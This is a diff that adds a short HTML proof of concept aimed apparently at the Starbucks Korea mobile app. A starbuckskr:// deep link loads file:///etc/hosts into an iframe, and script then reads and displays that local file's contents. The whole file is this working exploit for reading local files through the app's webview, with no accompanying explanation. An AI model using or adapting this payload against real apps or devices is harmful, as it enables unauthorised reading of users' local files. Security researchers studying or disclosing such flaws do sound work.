@@ -1,0 +1,7 @@
+<iframe id="star2" src="starbuckskr://deeplink?main=WHATS_NEW&sub=DETAIL&url=file:///etc/hosts" ></iframe></br>
+<script type="text/javascript">
+	document.getElementById("star2").onload = function() {
+		var cont = document.getElementById('star2').contentWindow.document;
+		alert(cont.documentElement.outerHTML);
+	}
+</script>
